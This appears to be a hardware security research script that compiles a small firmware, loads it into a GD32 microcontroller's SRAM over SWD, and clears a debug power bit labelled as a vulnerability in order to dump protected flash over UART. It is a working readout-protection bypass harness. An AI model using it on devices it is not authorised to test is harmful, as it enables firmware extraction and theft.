#!/usr/bin/env bash
# Build flash dump firmware, load into SRAM, clear CDBGPWRUPREQ, capture output.
#
# Usage: ./run_flash_dump.sh
#
# This script:
#   1. Compiles flash_dump.c for Cortex-M3 (SRAM execution)
#   2. Starts the capture script in background
#   3. Loads the binary into SRAM via SWD
#   4. Clears CDBGPWRUPREQ (GigaVulnerability #2)
#   5. Waits for the dump to complete
#
# SAFE: Only READS flash memory. Does NOT erase, write, or unlock anything.
set -euo pipefail
cd "$(dirname "$0")"

SRC=flash_dump.c
LD=sram.ld
ELF=flash_dump.elf
BIN=flash_dump.bin
OUTPUT=gd32_flash.bin
PORT=/dev/ttyACM0

echo "=== Step 1: Building ==="
arm-none-eabi-gcc \
    -mcpu=cortex-m3 -mthumb -Os \
    -nostdlib -nostartfiles -ffreestanding \
    -T ${LD} -Wl,--entry=main \
    -o ${ELF} ${SRC}

arm-none-eabi-objcopy -O binary ${ELF} ${BIN}
arm-none-eabi-size ${ELF}

ENTRY=$(arm-none-eabi-nm ${ELF} | grep ' T main' | awk '{print $1}')
ENTRY_THUMB=$(printf "0x%08X" $(( 0x${ENTRY} | 1 )))
echo "Entry: 0x${ENTRY} → PC=${ENTRY_THUMB}"
SIZE=$(stat -c%s ${BIN})
echo "Binary: ${SIZE} bytes"

VENV_PYTHON="$(cd "$(dirname "$0")/../.." && pwd)/.venv/bin/python3"
if [ ! -f "${VENV_PYTHON}" ]; then
    VENV_PYTHON=python3
fi

echo ""
echo "=== Step 2: Starting capture (background) ==="
${VENV_PYTHON} capture_dump.py --port ${PORT} --baud 115200 -o ${OUTPUT} --timeout 120 &
CAPTURE_PID=$!
sleep 1

echo ""
echo "=== Step 3: Loading into SRAM + clearing CDBGPWRUPREQ ==="
echo "  The code will:"
echo "    1. Initialize UART"
echo "    2. Send READY"
echo "    3. Wait ~3 seconds"
echo "    4. Read flash → send hex over UART"
echo ""
echo "  OpenOCD will clear CDBGPWRUPREQ during the 3-second wait."
echo ""

openocd \
    -f interface/cmsis-dap.cfg \
    -c "transport select swd" \
    -c "adapter speed 1000" \
    -f target/stm32f1x.cfg \
    -c "gdb_port disabled" \
    -c "telnet_port disabled" \
    -c "tcl_port disabled" \
    -c "init" \
    -c "reset halt" \
    -c "load_image ${BIN} 0x20000000 bin" \
    -c "reg sp 0x20002000" \
    -c "reg pc ${ENTRY_THUMB}" \
    -c "reg xPSR 0x01000000" \
    -c "resume" \
    -c "sleep 500" \
    -c "stm32f1x.dap dpreg 0x4 0x0" \
    -c "exit"

echo ""
echo "=== Step 4: Waiting for dump to complete ==="
echo "  (Ctrl+C to abort)"
wait ${CAPTURE_PID}
echo ""
echo "=== Done ==="
